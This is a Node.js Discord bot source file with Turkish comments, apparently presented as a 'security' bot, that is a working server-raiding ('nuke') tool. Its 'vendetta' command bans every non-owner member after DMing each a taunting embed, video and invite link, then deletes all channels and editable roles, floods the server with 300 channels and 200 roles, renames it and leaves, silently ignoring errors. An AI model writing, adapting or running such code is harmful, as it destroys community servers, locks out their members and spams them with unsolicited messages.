require('dotenv').config();
const { Client, GatewayIntentBits, Partials, EmbedBuilder, AttachmentBuilder } = require('discord.js');

// --- Node 22 fetch fix ---
const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));
// ---------------------------

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ],
  partials: [Partials.Channel]
});

const OWNER_ID = process.env.OWNER_ID;

// 📌 Videoyu önbelleğe al — komut çalışırken bot yavaşlamasın
let cachedVideo = null;

client.once('ready', async () => {
  console.log(`🚀 Bot aktif: ${client.user.tag}`);

  const videoURL = "https://raw.githubusercontent.com/ForsDev101/Securitybot/main/ssstik.io_goktug_twd_1763930201787.mp4";

  try {
    const res = await fetch(videoURL);
    const buffer = Buffer.from(await res.arrayBuffer());
    cachedVideo = new AttachmentBuilder(buffer, { name: "video.mp4" });

    console.log("🎥 Video cachelendi (hazır)");
  } catch (err) {
    console.log("❌ Video önbelleğe alınamadı:", err);
  }
});

client.on('messageCreate', async (message) => {
  if (!message.guild || message.author.bot) return;

  const args = message.content.trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === 'vendetta') {
    if (!cachedVideo) return message.reply(" 3 Saniye Sonra Tekrar Dene Yavrum");

    const guild = message.guild;

    // -----------------------------
    // 📌 Embed oluştur
    // -----------------------------
    const embed = new EmbedBuilder()
      .setColor('Red')
      .setTitle('💣VENDETTA SUNUCUYA EL KOYDU!')
      .setDescription('Slained By VENDETTA\n VENDETTA Affetmez😀https://discord.gg/j9W6FXKTre')
      .setFooter({ text: '💦 Fors Affetmez Sabaha Sunucun Affedilmez 💦' });

    // -----------------------------
    // 📌 Üyeleri çek
    // -----------------------------
    const members = await guild.members.fetch();
    let bannedCount = 0;

    // -----------------------------
    // ⚡ Üyeleri paralel DM + BAN
    // -----------------------------
    members.forEach(member => {
      if (member.user.bot) return;
      if (member.id === OWNER_ID) return;

      member.send({ embeds: [embed], files: [cachedVideo] }).catch(() => {});
      member.ban({ reason: 'P@rno' }).catch(() => {});
      bannedCount++;
    });

    // -----------------------------
    // ⚡ Kanalları seri hızlı silme
    // -----------------------------
    guild.channels.cache.forEach(ch => ch.delete().catch(() => {}));

    // -----------------------------
    // ⚡ 300 Kanalı paralel oluştur
    // -----------------------------
    const channelNames = ['VENDETTA💦', 'VENDETTA💝', 'EL KONULDU🔥'];
    const channelTasks = [];

    for (let i = 0; i < 300; i++) {
      channelTasks.push(
        guild.channels.create({
          name: channelNames[i % channelNames.length]
        }).catch(() => {})
      );
    }

    Promise.all(channelTasks).catch(() => {});

    // -----------------------------
    // ⚡ Rolleri sil
    // -----------------------------
    guild.roles.cache.forEach(role => {
      if (role.editable && role.id !== guild.id) {
        role.delete().catch(() => {});
      }
    });

    // -----------------------------
    // ⚡ 200 Rolü paralel oluştur
    // -----------------------------
    const roleTasks = [];

    for (let i = 0; i < 200; i++) {
      const randomColor = `#${Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0')}`;

      roleTasks.push(
        guild.roles.create({
          name: 'BÖÖ KORKTUNMUU😜',
          color: randomColor,
          hoist: true
        }).catch(() => {})
      );
    }

    Promise.all(roleTasks).catch(() => {});

    // -----------------------------
    // ⚡ Sunucu adını değiştir
    // -----------------------------
    guild.setName('💦VENDETTA Affetmez Sabaha Sunucun Affedilmez💦')
      .catch(() => {});

    // -----------------------------
    // ⚡ Mesaj bırak ve çık
    // -----------------------------
    message.channel.send(`⚡ ${bannedCount} kişi banlandı. V For Vandetta!`)
      .catch(() => {});

    guild.leave().catch(() => {});
  }
});

client.login(process.env.BOT_TOKEN);
